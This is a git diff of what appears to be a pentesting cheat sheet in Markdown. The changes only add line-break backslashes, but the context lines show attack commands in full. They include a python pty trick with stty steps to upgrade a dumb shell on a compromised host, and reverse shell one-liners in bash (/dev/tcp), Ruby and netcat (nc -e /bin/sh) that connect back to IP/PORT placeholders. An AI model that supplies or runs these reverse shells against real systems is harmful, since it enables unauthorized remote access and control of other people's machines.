@@ -11,14 +11,14 @@ If this doesnt work use python2 version.
 # For Requesting a Interactive Shell in Python
 python -c 'import pty; pty.spawn("/bin/bash")'
 This will upgrade a dumb shell to an interactive one
-If this doesnt work for you then try doing this step wise 
+If this doesnt work for you then try doing this step wise\ 
 
 **In reverse shell**
 $ python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
+Ctrl-Z\
 **In Kali**
 $ stty raw -echo
-$ fg
+$ fg\
 
 **In reverse shell**
 $ reset
@@ -27,9 +27,9 @@ $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
   
 # THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
-**THIS IS USED FOR REVERSE CONNECTIONS.
-IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"
-YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**
+**THIS IS USED FOR REVERSE CONNECTIONS.\
+IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"\
+YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**\
 # BASH
 bash -i >& /dev/tcp/IP/PORT 0>&1
 
@@ -47,5 +47,5 @@ ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d 
 
 # Netcat
 nc -e /bin/sh IP PORT
---------------x-------x--------xx-------------xxx----------x------------------x-----------------xxx---------------------x---------------------xxxxx--------x---------------------
+
 
